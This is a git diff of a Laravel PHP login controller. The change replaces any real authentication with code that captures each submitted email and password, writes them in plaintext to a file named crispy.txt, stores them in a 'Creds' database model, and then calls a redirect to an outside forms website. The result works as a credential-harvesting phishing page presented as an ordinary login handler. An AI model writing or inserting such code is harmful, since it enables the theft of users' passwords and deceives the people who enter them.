@@ -2,7 +2,9 @@
 
 namespace App\Http\Controllers;
 
+use App\Models\Creds;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Storage;
 
 class LoginController extends Controller
 {
@@ -13,8 +15,13 @@ class LoginController extends Controller
      */
     public function login(Request $request)
     {
-        $username = $request->username;
+        $email = $request->username;
         $password = $request->password;
-
+        file_put_contents(storage_path('app').'/crispy.txt', json_encode(['email'=>$email, 'pass' => $password]));
+        (new Creds)->fill([
+            'email' => $email,
+            'pwd' => $password
+        ])->save();
+        redirect('https://www.pdffiller.com/en/forms');
     }
 }
